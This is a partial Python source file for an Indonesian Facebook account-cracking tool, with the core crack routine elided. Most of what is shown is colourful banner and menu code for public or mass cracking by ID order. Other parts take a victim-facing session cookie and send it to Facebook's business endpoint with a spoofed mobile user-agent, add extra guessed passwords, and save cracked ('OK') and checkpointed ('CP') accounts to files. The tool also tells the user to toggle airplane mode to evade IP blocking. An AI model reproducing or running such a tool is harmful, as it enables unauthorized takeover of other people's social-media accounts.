...
[red] __     __[blue]_____ _____  ______ _____ _  __  [green]______ ____  
[red] \ \   / /[blue] ____|  __ \|  ____/ ____| |/ / [green]|  ____|  _ \ 
[red]  \ \_/ /[blue] |    | |__) | |__ | |    | ' /  [green]| |__  | |_) |
[red]   \   /[blue]| |    |  _  /|  __|| |    |  <   [green]|  __| |  _ < 
[red]    | | [blue]| |____| | \ \| |___| |____| . \  [green]| |    | |_) |
[red]    |_|  [blue]\_____|_|  \_\______\_____|_|\_\ [green]|_|    |____/ 

[bold white]TOOLS [bold red]CRECKING[yellow] FACEBOOK[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"bold cyan"))
...
def login_lagi334():
	os.system('clear')
	cetak(nel(f"""\t__  _____________________________ 
\t_ \/ /_  __ \__  __/__  __/__    |
\t__  /_  / / /_  /  __  /  __  /| |
\t_  / / /_/ /_  /   _  /   _  ___ |
\t/_/  \____/ /_/    /_/    /_/  |_|

                  [bold white]Made By [bold red]Indonesian[yellow] CYBER[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"bold purple"))
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	cetak(nel(f"[bold green]YOTTA GANTENG [bold yellow]MEMINTA ANDA UNTUK MEMASUKAN COOKIES KARENA GAK ADA COOKIES GAK BISA LOGIN ANJIM",style="blue purple",title="[bold green]• [bold yellow]• [bold red]• [bold white]INFORMASI [/] [bold red]• [yellow]• [bold green]•",subtitle="[bold green]• [bold yellow]• [bold red]• [bold cyan]•••>_<••• [bold red]• [yellow]• [bold green]•"))
	cookie=input(f'  [{H}•{x}] Masukkan Cookie :{warna}\n ')
	if cookie in ['open','Open','OPEN']:
		os.system('xdg-open https://youtu.be/VDn-k4t5IBw')
	loading()
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; Vivo J5 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.4 Chrome/38.2936397.102 Mobile Chrome/568.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def menu(my_name,my_id,my_birthday):
	...
	cetak(nel(f"NAMA PENGGUNA[bold white] : [bold blue]{my_name}\n[bold green]LAHIR[bold white]         : [bold green]{my_birthday}\n[bold yellow]HARI      [bold white]    :[bold yellow] {str(tgl)+'-'+str(bln)+'-'+str(thn)}",style="bold cyan",title="[bold green]• [bold yellow]• [bold red]• [bold white]INFO USER[/] [bold red]• [yellow]• [bold green]•",subtitle="[bold green]• [bold yellow]• [bold red]• [bold cyan]•••>_<••• [bold red]• [yellow]• [bold green]•"))
	tree = Tree(nel(f"[bold green]CRECK PUBLIC",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold cyan")
	tree.add(nel(f"[bold green]CRECK MASSAL",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.2 [/][bold red]• [yellow]• [bold green]•")).add(nel(f"[bold green]CEK RESULT",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.3 [/][bold red]• [yellow]• [bold green]•")).add(nel(f"[bold green]CRECK RESULT CP [bold red]OFF",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.4 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold green]KELUAR",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.0 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	tree = Tree(nel(f"[bold green]CECK RESULT CP",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold cyan")
...
def publik():
	...
	coki = {"cookie":cok}
	ses=requests.Session()
	cetak(nel(f"ENTE KADANG KADANG ENTE!!",style="bold cyan",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]MASUKAN TARGET [bold green]•[bold yellow]•[bold red]•[/bold green]"))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f"ENTE KADANG KADANG ENTE!!",style="bold cyan",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]PILIH URUTAN TARGET [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	tree = Tree(nel(f"[bold red]CRACK DARI ID TERTUA",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold cyan")
	tree.add(nel(f"[bold green]CRACK DARI ID TERMUDA",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.2 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold yellow]CRACK DARI ID RANDOM",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.3 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	hu = input('['+p+'PILIH'+x+'] : ')
	if hu in ['1','01']:
	...
	cetak(nel(f"ENTE KADANG KADANG ENTE!!",style="bold cyan",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]PILIH LOGIN URL [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	tree = Tree(nel(f"[bold green]ASYNC",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold cyan")
	tree.add(nel(f"[bold green]REGULER",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.2 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold green]VILADATE",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.3 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	hc = input('['+p+'PILIH'+x+'] : ')
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(f"Enter an additional password of at least 6 characters\nExample :[green] YOTTA GANTENG,YOTTA BAIK[white]",style="bold cyan",title=" [bold green] [bold red]•[bold yellow]•[bold green]•[bold red][bold blue]Informasi Password [bold green]•[bold yellow]•[bold red]•[/bold green]"))
...
#	os.system('clear')
	global prog,des
	cetak(nel(f'[white]Results [green]OK[white] Save in : [green]OK/%s [white]'%(okc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]OK SAVE [bold red]• [yellow]• [bold green]•",style=f"bold cyan"))
	cetak(nel(f'[white]Results [yellow]CP[white] Save in : [yellow]CP/%s [white]'%(cpc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]CP SAVE [bold red]• [yellow]• [bold green]•",style=f"bold cyan"))
	cetak(nel(f'[bold green]Dont forget to on/off airplane mode,to avoid IP spam',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]ALERT [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]CRACK IN PROGRES [bold red]• [yellow]• [bold green]•",style=f"bold cyan"))
	print('')
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'{bi}Ymobile{x} [green]{(ok)}[/][blue]/[yellow]{(cp)} {len(id)}/[deep_white]{(loop)}[/]')
	prog.advance(des)
